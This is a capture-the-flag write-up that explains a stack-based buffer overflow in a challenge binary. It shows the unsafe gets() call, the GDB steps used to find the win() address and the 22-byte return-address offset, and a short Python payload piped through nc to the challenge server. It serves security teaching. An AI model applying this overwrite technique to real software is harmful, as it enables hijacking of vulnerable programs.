# Challenge `Return Address` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stack-based Buffer Overflow (Return Address Overwrite)
- Where: Where is the vulnerability present
  - The vulnerability is present in the `challenge` function:
```c
void challenge() {
  char buffer[10];
  gets(buffer);
}
```
The buffer has only 10 bytes, but `gets()` allows arbitrary-length input.
This makes it possible to overwrite the saved return address stored on the stack.
- Impact: What results of exploiting this vulnerability
  - Overwrite the saved return address
  - Redirect execution flow when challenge() returns
  - Force execution to jump to the win() function

## Steps to reproduce

1. Finding the target function address using GDB:
```
print win
```
Output:
```pgsql
$1 = {void ()} 0x80486f1 <win>
```
2. Inspecting the stack frame
```
break challenge
run
next
print &buffer
```
Output: `$2 = (char (*)[10]) 0xffffc846`

Inspect the current stack frame:
```
info frame
```
Relevant output: `Saved registers: eip at 0xffffc85c`
3. Calculating the offset the distance from buffer to saved return address: `0xffffc85c - 0xffffc846 = 0x16 = 22 bytes`
4. Send the payload to the challenge server having the little-endian system in consideration:
```bash
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25154
import sys
sys.stdout.buffer.write(b"A"*22 + b"\xf1\x86\x04\x08")
EOF
```